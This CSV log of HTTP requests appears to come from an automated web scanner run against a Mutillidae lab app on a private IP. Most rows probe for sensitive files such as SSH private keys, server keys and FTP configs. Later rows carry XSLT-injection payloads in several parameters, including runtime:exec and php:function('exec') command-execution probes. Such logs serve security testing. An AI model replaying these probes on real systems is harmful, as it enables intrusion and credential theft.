ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
8308,Sun Sep 06 14:28:48 WAT 2026,Sun Sep 06 14:28:48 WAT 2026,GET,http://192.168.56.107:8081/.svn/wc.db,404,Not Found,53,216,437
8309,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/CVS/root,404,Not Found,22,216,437
8310,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/images/gritter,301,Moved Permanently,16,278,372
8311,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/server-status,403,Forbidden,35,217,321
8312,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/core,404,Not Found,32,216,437
8313,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/sftp-config.json,404,Not Found,27,216,437
8314,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/WS_FTP.ini,404,Not Found,21,216,437
8315,Sun Sep 06 14:28:49 WAT 2026,Sun Sep 06 14:28:49 WAT 2026,GET,http://192.168.56.107:8081/ws_ftp.ini,404,Not Found,35,216,437
8316,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/WS_FTP.INI,404,Not Found,143,216,437
8317,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/filezilla.xml,404,Not Found,26,216,437
8318,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/sitemanager.xml,404,Not Found,8,216,437
8319,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/FileZilla.xml,404,Not Found,36,216,437
8320,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/winscp.ini,404,Not Found,17,216,437
8321,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/WinSCP.ini,404,Not Found,9,216,437
8322,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/.DS_Store,404,Not Found,26,216,437
8323,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/.php_cs.cache,404,Not Found,19,216,437
8324,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/DEADJOE,404,Not Found,11,216,437
8325,Sun Sep 06 14:28:52 WAT 2026,Sun Sep 06 14:28:52 WAT 2026,GET,http://192.168.56.107:8081/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,48,216,437
8326,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/javascript,301,Moved Permanently,47,274,368
8328,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/javascript/ddsmoothmenu,301,Moved Permanently,5,287,381
8327,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/app/etc/local.xml,404,Not Found,51,216,437
8329,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/server.key,404,Not Found,47,216,437
8330,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/javascript/gritter,301,Moved Permanently,12,282,376
8331,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/privatekey.key,404,Not Found,31,216,437
8332,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/javascript/hints,301,Moved Permanently,16,280,374
8333,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/myserver.key,404,Not Found,19,216,437
8334,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/key.pem,404,Not Found,46,216,437
8335,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/javascript/inline-initializers,301,Moved Permanently,24,294,388
8336,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/id_rsa,404,Not Found,37,216,437
8337,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/id_dsa,404,Not Found,32,216,437
8338,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/.ssh/id_rsa,404,Not Found,11,216,437
8339,Sun Sep 06 14:28:53 WAT 2026,Sun Sep 06 14:28:53 WAT 2026,GET,http://192.168.56.107:8081/.ssh/id_dsa,404,Not Found,31,216,437
8340,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/adminer.php,404,Not Found,21,216,437
8341,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/javascript/jQuery,301,Moved Permanently,34,281,375
8342,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/vb_test.php,404,Not Found,96,216,437
8343,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/javascript/jQuery/colorbox,301,Moved Permanently,32,290,384
8344,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/CHANGELOG.txt,404,Not Found,29,216,437
8345,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/sites/default/files/.ht.sqlite,404,Not Found,60,216,437
8346,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/composer.json,404,Not Found,26,216,437
8347,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/composer.lock,404,Not Found,54,216,437
8348,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/vim_settings.xml,404,Not Found,31,216,437
8349,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/styles,301,Moved Permanently,13,270,364
8350,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:54 WAT 2026,GET,http://192.168.56.107:8081/server-info,404,Not Found,70,216,437
8351,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:55 WAT 2026,GET,http://192.168.56.107:8081/styles/ddsmoothmenu,301,Moved Permanently,37,283,377
8352,Sun Sep 06 14:28:54 WAT 2026,Sun Sep 06 14:28:55 WAT 2026,GET,http://192.168.56.107:8081/phpinfo.php,200,OK,119,254,84412
8353,Sun Sep 06 14:28:55 WAT 2026,Sun Sep 06 14:28:55 WAT 2026,GET,http://192.168.56.107:8081/styles/gritter,301,Moved Permanently,25,278,372
8355,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/info.php,404,Not Found,34,216,437
8356,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/i.php,404,Not Found,28,216,437
8357,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/test.php,404,Not Found,17,216,437
8358,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/_wpeprivate/config.json,404,Not Found,46,216,437
8359,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/_framework/blazor.boot.json,404,Not Found,29,216,437
8360,Sun Sep 06 14:28:56 WAT 2026,Sun Sep 06 14:28:56 WAT 2026,GET,http://192.168.56.107:8081/.hg,404,Not Found,15,216,437
8361,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,GET,http://192.168.56.107:8081/.bzr,404,Not Found,28,216,437
8362,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,GET,http://192.168.56.107:8081/._darcs,404,Not Found,57,216,437
8363,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,GET,http://192.168.56.107:8081/BitKeeper,404,Not Found,66,216,437
8364,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,GET,http://192.168.56.107:8081,200,OK,73,519,56149
8365,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,GET,http://192.168.56.107:8081/images,301,Moved Permanently,36,271,364
8366,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:57 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3C,200,OK,122,472,56149
8367,Sun Sep 06 14:28:57 WAT 2026,Sun Sep 06 14:28:58 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,93,472,56149
8368,Sun Sep 06 14:28:58 WAT 2026,Sun Sep 06 14:28:58 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avedor%27%29%22%2F%3E,200,OK,127,472,56149
8369,Sun Sep 06 14:28:58 WAT 2026,Sun Sep 06 14:28:58 WAT 2026,GET,http://192.168.56.107:8081/images/gritter,301,Moved Permanently,114,279,372
8370,Sun Sep 06 14:28:58 WAT 2026,Sun Sep 06 14:28:58 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,104,472,56149
8371,Sun Sep 06 14:29:03 WAT 2026,Sun Sep 06 14:29:03 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=system-property%28%27xsl%3Avedor%27%29%2F%3E,200,OK,348,472,56149
8372,Sun Sep 06 14:29:03 WAT 2026,Sun Sep 06 14:29:03 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,147,472,56149
8373,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:04 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avedor%27%29%22%2F%3E%3C%21--,200,OK,152,472,56149
8374,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:04 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3C,200,OK,102,473,51127
8375,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:04 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3C&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,197,473,53877
8376,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,183,473,51339
8377,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3C&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,237,473,53031
8378,Sun Sep 06 14:29:04 WAT 2026,Sun Sep 06 14:29:04 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,194,472,56149
8379,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,167,473,51247
8380,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,158,473,53877
8381,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,169,473,53031
8382,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,168,473,51367
8383,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avedor%27%29%22%2F%3E%3C%21--,200,OK,169,472,56149
8384,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=system-property%28%27xsl%3Avendor%27%29%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,88,473,53031
8385,Sun Sep 06 14:29:05 WAT 2026,Sun Sep 06 14:29:05 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=system-property%28%27xsl%3Avendor%27%29%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,118,473,53877
8386,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,156,473,51355
8387,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,90,472,53877
8388,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,161,473,53031
8389,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.56.107%3A22%27%29%22%2F%3E,200,OK,163,473,56149
8390,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.56.107%3A22%27%29%22%2F%3E,200,OK,124,473,51367
8391,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,222,473,53877
8392,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:06 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,241,473,53031
8393,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,205,473,52103
8394,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.56.107%3A22%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,90,472,53877
8395,Sun Sep 06 14:29:06 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,288,473,56149
8396,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,221,473,51419
8397,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.56.107%3A22%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,184,473,53031
8398,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,161,473,53877
8399,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,149,473,53031
8400,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/javascript,301,Moved Permanently,140,275,368
8401,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:07 WAT 2026,POST,http://192.168.56.107:8081/index.php?page=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,175,472,56149
8402,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,190,473,53877
8403,Sun Sep 06 14:29:08 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&page=%2Fvar%2Fwww%2Fmutillidae%2Fhome.php,200,OK,403,472,53031
8404,Sun Sep 06 14:29:07 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3C,200,OK,270,473,56149
8405,Sun Sep 06 14:29:08 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=toggle-security&page=%3C,200,OK,59,602,50995
8406,Sun Sep 06 14:29:08 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,136,603,55742
8407,Sun Sep 06 14:29:08 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=SL5&page=%3C,200,OK,248,603,50995
8408,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/javascript/ddsmoothmenu,301,Moved Permanently,28,288,381
8409,Sun Sep 06 14:29:08 WAT 2026,Sun Sep 06 14:29:08 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=toggle-security&page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,163,472,51511
8410,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,189,473,56222
8411,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=SL5&page=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,112,472,51511
8412,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=toggle-security&page=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,86,472,51320
8413,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/javascript/gritter,301,Moved Permanently,57,283,376
8414,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=SL5&page=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,174,473,51320
8415,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:09 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,159,473,56149
8416,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=SL5&page=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,148,602,50996
8417,Sun Sep 06 14:29:09 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/index.php?do=toggle-security&page=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,55,603,50995
8418,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,179,603,55742
8419,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/javascript/hints,301,Moved Permanently,23,281,374
8420,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.56.107%3A22%27%29%22%2F%3E,200,OK,114,602,55742
8421,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:10 WAT 2026,GET,http://192.168.56.107:8081/javascript/inline-initializers,301,Moved Permanently,118,295,388
8422,Sun Sep 06 14:29:10 WAT 2026,Sun Sep 06 14:29:11 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,191,603,55742
8423,Sun Sep 06 14:29:11 WAT 2026,Sun Sep 06 14:29:11 WAT 2026,GET,http://192.168.56.107:8081/index.php?popUpNotificationCode=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,85,602,55742
8424,Sun Sep 06 14:29:11 WAT 2026,Sun Sep 06 14:29:11 WAT 2026,GET,http://192.168.56.107:8081/javascript/jQuery,301,Moved Permanently,34,282,375
8425,Sun Sep 06 14:29:11 WAT 2026,Sun Sep 06 14:29:11 WAT 2026,GET,http://192.168.56.107:8081/javascript/jQuery/colorbox,301,Moved Permanently,42,290,384
8426,Sun Sep 06 14:29:12 WAT 2026,Sun Sep 06 14:29:12 WAT 2026,GET,http://192.168.56.107:8081/styles,301,Moved Permanently,46,270,364
